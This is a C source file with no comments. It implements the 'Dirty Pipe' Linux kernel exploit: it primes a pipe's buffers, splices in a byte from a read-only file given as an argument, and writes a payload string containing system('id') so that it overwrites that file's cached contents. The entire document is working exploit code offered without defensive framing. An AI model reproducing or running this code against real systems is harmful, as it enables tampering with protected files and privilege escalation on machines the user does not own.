#define _GNU_SOURCE
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include<sys/stat.h>
#include<sys/types.h>
#include<fcntl.h>

void pipe_prep(int *pfd){
    char buffer[4096];
    int bfsz=sizeof(buffer);
    int  pipe_buff_sz=fcntl(pfd[1],F_GETPIPE_SZ);
    for(int i=pipe_buff_sz;i>0;){

       write(pfd[1],buffer,bfsz);
       i-=bfsz;
    }
    for(int i=pipe_buff_sz;i>0;){

       read(pfd[0],buffer,bfsz);
       i-=bfsz;
    }
}

void dirty_pipe(int *pfd,int fd){
    char *string="\xasystem('id')";
    splice(fd,0,pfd[1],NULL,1,0);
    write(pfd[1],string,strlen(string));
}
int main(int argc,char **argv){
   int pfd[2];
   struct stat stbuf;
   int fd=open(argv[1],O_RDONLY);
   fstat(fd,&stbuf);
   pipe(pfd);
   pipe_prep(pfd);
   dirty_pipe(pfd,fd);
}
